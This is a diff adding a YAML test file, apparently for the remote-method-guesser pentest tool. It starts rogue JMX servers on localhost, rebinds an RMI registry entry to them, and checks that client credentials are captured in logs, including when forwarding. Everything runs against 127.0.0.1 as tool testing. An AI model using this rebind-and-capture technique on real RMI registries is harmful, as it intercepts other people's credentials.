@@ -1,0 +1,137 @@
+tester:
+  title: Rogue JMX Tests (child)
+  description: |-
+    "Perform tests on remote-method-guesser's roguejmx action"
+
+
+plugins:
+    - os_command:
+        init: 1
+        shell: true
+        background: true
+        cmd:
+            - rmg
+            - roguejmx
+            - 127.0.0.1
+            - 9999
+            - --no-color
+            - --objid
+            - "'${ROGUE_OBJID}'"
+            - '&>'
+            - ${JMX_LOG_1}
+
+    - os_command:
+        init: 1
+        shell: true
+        background: true
+        cmd:
+            - rmg
+            - roguejmx
+            - 127.0.0.1
+            - 9998
+            - --no-color
+            - --objid
+            - "'${ROGUE_OBJID}'"
+            - --forward-host
+            - 127.0.0.1
+            - --forward-port
+            - ${FORWARD_PORT-0-1}
+            - --forward-objid
+            - "'${FORWARD_OBJID-0-1}'"
+            - '&>'
+            - ${JMX_LOG_2}
+
+
+tests:
+  - title: Preparation (Credentials)
+    description: |-
+      'Bind rogue JMX server to the RMI registry'
+
+    command:
+      - rmg
+      - rebind
+      - 127.0.0.1
+      - 1090
+      - 127.0.0.1:9999
+      - jmxrmi
+      - --bind-objid
+      - ${ROGUE_OBJID}
+
+    validators:
+      - error: False
+
+
+  - title: Credentials
+    description: |-
+      'Attempts to capture credentials using the rogue JMX server'
+
+    command:
+      - beanshooter
+      - 127.0.0.1
+      - 1090
+      - status
+      - --username
+      - admin
+      - --password
+      - s3crEt!
+
+    validators:
+      - error: True
+      - contains:
+          values:
+            - 'Authentication failed!'
+      - file_contains:
+            - file: ${JMX_LOG_1}
+              contains:
+                - 'Got incoming call for newClient'
+                - 'Username: admin'
+                - 'Password: s3crEt!'
+
+
+  - title: Preparation (Forward)
+    description: |-
+      'Bind forwarding rogue JMX server to the RMI registry'
+
+    command:
+      - rmg
+      - rebind
+      - 127.0.0.1
+      - 1090
+      - 127.0.0.1:9998
+      - jmxrmi
+      - --bind-objid
+      - ${ROGUE_OBJID}
+
+    validators:
+      - error: False
+
+
+  - title: Forward
+    description: |-
+      'Attempts to connect to the JMX server using the forwarding rogue JMX'
+
+    command:
+      - beanshooter
+      - 127.0.0.1
+      - 1090
+      - status
+      - --username
+      - admin
+      - --password
+      - s3crEt!
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - 'Getting Status of MLet... done!'
+            - 'MLet is not registered on the JMX server.'
+            - 'Getting Status of malicious Bean... done!'
+            - 'Malicious MBean is not registered on the JMX server.'
+
+      - file_contains:
+            - file: ${JMX_LOG_2}
+              contains:
+                - 'Got incoming call for newClient'
+                - 'Username: admin'
+                - 'Password: s3crEt!'
